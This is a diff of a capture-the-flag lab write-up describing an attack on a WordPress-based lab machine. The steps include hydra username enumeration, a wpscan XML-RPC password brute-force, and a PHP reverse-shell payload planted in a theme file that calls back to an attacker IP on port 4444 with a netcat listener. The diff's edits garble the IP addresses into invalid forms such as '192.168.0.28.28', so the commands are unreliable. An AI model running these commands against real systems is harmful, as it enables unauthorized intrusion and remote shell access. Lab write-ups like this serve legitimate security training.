@@ -25,7 +25,7 @@ key-1-of-3.txt
 ```
 
 ### Flag 1/3 (Foothold)
-The location of the first flag was disclosed directly inside the `robots.txt` routing guidelines. Requesting the resource path `http://192.168.0` yielded the first successful capture.
+The location of the first flag was disclosed directly inside the `robots.txt` routing guidelines. Requesting the resource path `http://192.168.0.28` yielded the first successful capture.
 
 ### Asset Processing: Dictionary Optimization
 The text asset `fsocity.dic` serves as a dedicated wordlist for subsequent authentication attacks. Upon download, analysis revealed the raw file size exceeded 850,000 strings due to heavy padding and line repetitions. 
@@ -53,7 +53,7 @@ To discover valid profiles without relying on automated API modules, a target au
 WordPress responds natively with `Invalid username` upon invalid accounts. The attack script monitored for the absence of this failure string:
 
 ```bash
-hydra -L ./clean.txt -p password_doesnt_matter 192.168.0.28 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
+hydra -L ./clean.txt -p password_doesnt_matter 192.168.0.28.28 http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:Invalid username'
 ```
 
 The sweep isolated a valid character profile: **`elliot`**.
@@ -62,7 +62,7 @@ The sweep isolated a valid character profile: **`elliot`**.
 With the username verified, the brute-force architecture was pivoted to exploit the application's native XML-RPC layer (`/xmlrpc.php`). This method utilizes a protocol optimization technique allowing up to hundreds of credential combinations to be transmitted within a single HTTP request packet, bypassing classic single-entry rate mitigations.
 
 ```bash
-wpscan --url http://192.168.0.28/ --usernames elliot --passwords clean.txt
+wpscan --url http://192.168.0.28.28/ --usernames elliot --passwords clean.txt
 ```
 
 The automated multicall vector successfully cracked the authentication barrier:
@@ -87,7 +87,7 @@ Using the cracked credentials, authentication was completed against the manageme
 3. Completely deleted the default error-handling framework and replaced it with a custom socket reverse execution payload.
 4. Modified the script variables to match the local attack infrastructure:
    ```php
-   $ip = '192.168.0.21';  // Attacker Local Terminal IP
+   $ip = '192.168.0.28.21';  // Attacker Local Terminal IP
    $port = 4444;          // Active Listening Port
    ```
 5. Committed the modification via the **Update File** utility.
@@ -99,7 +99,7 @@ An execution terminal local to the attacker machine was initialized to capture t
 nc -lvnp 4444
 ```
 
-Navigating a web browser directly to the direct theme path triggered the updated error handler script layout: `http://192.168.0`. The connection dropped instantly, establishing an unprivileged background `/bin/sh` shell session as the low-privilege application profile `daemon`.
+Navigating a web browser directly to the direct theme path triggered the updated error handler script layout: `http://192.168.0.28`. The connection dropped instantly, establishing an unprivileged background `/bin/sh` shell session as the low-privilege application profile `daemon`.
 
 ---
 ### 🖼️ Phase 3 Screenshots
